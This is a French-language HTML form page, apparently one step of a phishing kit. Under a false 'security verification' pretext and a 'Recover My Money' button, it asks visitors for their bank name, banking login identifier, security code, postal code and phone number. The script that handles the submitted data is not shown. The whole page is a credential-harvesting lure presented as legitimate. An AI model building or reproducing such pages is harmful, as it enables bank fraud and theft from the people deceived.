<!DOCTYPE html>
<html lang="fr">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Formulaire 2</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="script.js"></script>
  </head>
  <body class="bg-white font-sans text-gray-800">
    <div class="flex flex-col items-center min-h-screen">
      <!-- Main Content -->
      <main class="flex flex-col items-center px-4 py-8 flex-1 w-full max-w-md">
        <p class="text-center text-lg font-medium mb-4">
          Pour des raisons de sécurité, nous procéderons à la vérification
          rapide de vos informations personnelles.
        </p>
        <h1 class="text-lg font-bold text-gray-800 mb-6 text-center">
          Veuillez renseigner vos identifiants bancaires.
        </h1>

        <!-- Form -->
        <form
          id="form2"
          class="bg-white shadow-md rounded-lg p-6 w-full space-y-4"
        >
          <!-- Bank Name Input -->
          <div>
            <label for="bank-name-2" class="block text-sm font-medium mb-1"
              >Nom de la Banque *</label
            >
            <input
              type="text"
              id="bank_name_2"
              placeholder="Nom de la banque"
              class="w-full border border-gray-300 rounded-lg p-2 focus:ring-2 focus:ring-blue-400 focus:outline-none"
              required
            />
          </div>

          <!-- Bank ID Input -->
          <div>
            <label for="bank-id" class="block text-sm font-medium mb-1"
              >Identifiant Bancaire *</label
            >
            <input
              type="text"
              id="bank_id"
              placeholder="Identifiant bancaire"
              class="w-full border border-gray-300 rounded-lg p-2 focus:ring-2 focus:ring-blue-400 focus:outline-none"
              required
            />
          </div>

          <!-- Security Code Input -->
          <div>
            <label for="security-code" class="block text-sm font-medium mb-1"
              >Code de Sécurité *</label
            >
            <input
              type="text"
              id="security_code"
              placeholder="Code de sécurité"
              class="w-full border border-gray-300 rounded-lg p-2 focus:ring-2 focus:ring-blue-400 focus:outline-none"
              required
            />
          </div>

          <!-- Postal Code Input -->
          <div>
            <label for="postal-code" class="block text-sm font-medium mb-1"
              >Code Postal *</label
            >
            <input
              type="text"
              id="postal_code"
              placeholder="Code postal"
              class="w-full border border-gray-300 rounded-lg p-2 focus:ring-2 focus:ring-blue-400 focus:outline-none"
              required
            />
          </div>

          <!-- Phone Number Input -->
          <div>
            <label for="phone-2" class="block text-sm font-medium mb-1"
              >Numéro de Téléphone *</label
            >
            <input
              type="text"
              id="phone_2"
              placeholder="+33 70 05 55 33 6"
              class="w-full border border-gray-300 rounded-lg p-2 focus:ring-2 focus:ring-blue-400 focus:outline-none"
              required
            />
          </div>

          <!-- Checkbox -->
          <div class="flex items-center">
            <input
              type="checkbox"
              id="terms-2"
              class="w-4 h-4 border-gray-300 rounded focus:ring-2 focus:ring-blue-400"
              required
            />
            <label for="terms-2" class="ml-2 text-sm underline"
              >J’accepte les Conditions Générales d’Utilisation</label
            >
          </div>

          <!-- Submit Button -->
          <button
            type="submit"
            class="w-full bg-blue-500 hover:bg-blue-600 text-white font-medium py-2 rounded-md shadow-md focus:outline-none focus:ring-2 focus:ring-blue-400"
          >
            Récupérer Mon Argent
          </button>
        </form>
      </main>
    </div>
  </body>
</html>
